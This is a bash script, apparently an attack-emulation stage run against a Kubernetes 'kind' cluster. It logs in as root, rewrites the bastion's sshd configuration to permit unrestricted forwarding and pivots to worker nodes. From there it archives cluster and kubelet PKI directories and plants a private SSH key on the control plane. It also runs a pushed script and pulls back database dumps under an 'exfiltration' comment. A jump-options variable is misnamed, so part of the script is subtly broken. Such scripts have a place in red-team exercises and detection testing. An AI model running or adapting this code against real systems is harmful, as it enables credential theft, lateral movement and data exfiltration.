#!/usr/bin/env bash
set -euo pipefail

# ========== CONFIG ==========
# Bastion
BASTION_USER="root"
BASTION_HOST="$CLUSTER_NAME-control-plane"
BASTION_PORT="122"
# Internal targets
TARGET_USER="root"
TARGET_PORT="122"
REMOTE_DIR_WORKER="/host/var/lib/kubelet/pki"
REMOTE_DIR_CP="/host/etc/kubernetes"

SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
OUT_DIR="$DATA_PATH/KC6/nodes-output"

KUBECONFIG="${KUBECONFIG:-$DATA_PATH/KC6/ops-admin.kubeconfig}"
HOSTS_FILE="$DATA_PATH/KC6/iphost"

# ========== PRECHECK ==========
need(){ command -v "$1" >/dev/null 2>&1 || { echo "[-] missing '$1'"; exit 1; }; }
need ssh; need tar; need awk; need jq; need kubectl

[[ -f "$SSH_KEY" ]] || { echo "[-] SSH_KEY not found: $SSH_KEY"; exit 1; }
[[ -f "${SSH_KEY}.pub" ]] || { echo "[-] Pub key missing: ${SSH_KEY}.pub"; exit 1; }

mkdir -p "$OUT_DIR"
TS="$(date -u +%Y%m%d-%H%M%S)"

SSH_OPTS=(
  -n
  -i "$SSH_KEY"
  -o BatchMode=yes
  -o ConnectTimeout=8
  -o StrictHostKeyChecking=accept-new
  -o UserKnownHostsFile="$HOME/.ssh/known_hosts"
  -o IdentitiesOnly=yes
)

# Using ProxyCommand with params
JUMP_OPTS=(
  -o ProxyCommand="ssh -i $SSH_KEY -p ${BASTION_PORT} -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new -W %h:%p ${BASTION_USER}@${BASTION_HOST}"
)

# ========== 0) ENABLING FORWARDING ON BASTION ==========
echo "[*] Enabling TCP forwarding on bastion (if needed) and restart sshd..."

if ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" \
     'sshd -T | grep -q "^allowtcpforwarding yes$" && grep -q "^permitopen any$" <(sshd -T)'; then
  echo "[=] Forwarding already activ on bastion"
else
  ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" 'bash -s' <<'EOSH' || true
set -e
conf=/etc/ssh/sshd_config
cat >"$conf" <<'EOF'
Port 122
Protocol 2
HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
UseDNS no
ChallengeResponseAuthentication no
X11Forwarding no
PrintMotd no
ClientAliveInterval 120
ClientAliveCountMax 2
# >>> abilita jump/port-forwarding
AllowTcpForwarding yes
PermitOpen any
AllowStreamLocalForwarding yes
AllowAgentForwarding yes
EOF

/usr/sbin/sshd -t
# reload
pid="$(pidof sshd 2>/dev/null || echo 1)"
kill -HUP "$pid" || true
EOSH

  ok=false
  for i in {1..6}; do
    sleep 0.5
    if ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" \
         'sshd -T | egrep -q "^allowtcpforwarding yes$|^permitopen any$"'; then
      ok=true; break
    fi
  done
  if ! $ok; then
    echo "[-] Impossible to confirm AllowTcpForwarding/PermitOpen on bastion"; exit 1
  fi
  echo "[+] Forwarding activated on bastion"
fi

# ========== 1) BUILDING HOSTS_FILE (if empty) ==========
if [[ ! -s "$HOSTS_FILE" ]]; then
  echo "[i] generating $HOSTS_FILE from worker nodes"
  kubectl --kubeconfig "$KUBECONFIG" get nodes -o json \
  | jq -r '.items[]
    | select(.metadata.labels["node-role.kubernetes.io/control-plane"] | not)
    | "\(.status.addresses[] | select(.type=="InternalIP").address | select(test("^[0-9.]+$"))) - \(.metadata.name)"' \
  > "$HOSTS_FILE"
fi

# ========== FUNCTIONS ==========
test_ssh() { # $1 user $2 host $3 port [extra...]
  ssh "${SSH_OPTS[@]}" -p "$3" "${@:4}" "$1@$2" 'echo ok' >/dev/null 2>&1 \
    && echo "[+] SSH OK -> $1@$2:$3" || { echo "[-] SSH KO -> $1@$2:$3"; return 1; }
}

fetch_dir() { # $1 user $2 host $3 port $4 dest_sub $5 rdir [extra...]
  local user="$1" host="$2" port="$3" dest_sub="$4" rdir="$5"; shift 5
  local dest="${OUT_DIR}/${dest_sub}-${TS}"
  echo "[*] ${host}: copying '${rdir}' -> ${dest}/"
  mkdir -p "$dest"
  local parent base
  parent="$(dirname "$rdir")"; base="$(basename "$rdir")"
  ssh "${SSH_OPTS[@]}" -p "$port" "$@" "$user@$host" \
    "tar -C \"\$([ -d \"$parent\" ] && echo \"$parent\" || echo /)\" -cpf - \"$base\"" \
    | tar -C "$dest" -xpf - \
    && echo "[+] ${host}: OK -> ${dest}/$base" \
    || { echo "[-] ${host}: copy FAILED"; return 1; }
}

# ========== 2) TEST BASTION ==========
test_ssh "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" || {
  echo "   Tips: verification DS on control-plane and key in authorized_keys"; exit 1; }

# ========== 3) COPY FROM BASTION ==========
fetch_dir "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" "bastion_${BASTION_HOST}" "$REMOTE_DIR_CP"

# ========== 4) COPY FROM WORKERS (via ProxyCommand) ==========
if [[ -s "$HOSTS_FILE" ]]; then
  while IFS= read -r line; do
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    ip="$(echo "$line" | awk -F ' *- *' '{print $1}' | xargs)"
    tag="${line#* - }"
    [[ -z "$tag" ]] && tag="$ip"

    # test ssh via jump
    if ! test_ssh "$TARGET_USER" "$ip" "$TARGET_PORT" "${SSH_JUMP_OPTS[@]}"; then
      echo "   (skip $ip)"; continue
    fi

    fetch_dir "$TARGET_USER" "$ip" "$TARGET_PORT" "$tag" "$REMOTE_DIR_WORKER" \
      "${SSH_JUMP_OPTS[@]}"

    # Executing exfiltration from DBs
    scp -i "$SSH_KEY" -P 122 "/opt/caldera/KC4/container-admin1.sh" root@kind-cluster-control-plane:/tmp/container-admin1.sh
    scp -i "$SSH_KEY" -P 122 "$SSH_KEY" root@kind-cluster-control-plane:/tmp/key
    ssh -i "$SSH_KEY" -n -p 122 root@kind-cluster-control-plane 'chmod +x /tmp/container-admin1.sh'
    echo "Run script in pod"
    ssh -i $SSH_KEY -p 122 -n root@kind-cluster-control-plane "ssh -i /tmp/key -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -p 122 root@$ip '/usr/bin/env bash -s -- 1' < /tmp/container-admin1.sh"
    fetch_dir "$TARGET_USER" "$ip" "$TARGET_PORT" "$tag" "/tmp/exfiltration/dbs" \
      "${SSH_JUMP_OPTS[@]}"
    ssh -i "$SSH_KEY" -p 122 -n root@kind-cluster-control-plane 'rm -f /tmp/key'
      
  done < "$HOSTS_FILE"
else
  echo "[!] HOSTS_FILE empty: $HOSTS_FILE"
fi

echo "[✓] Done. Output in: $OUT_DIR"
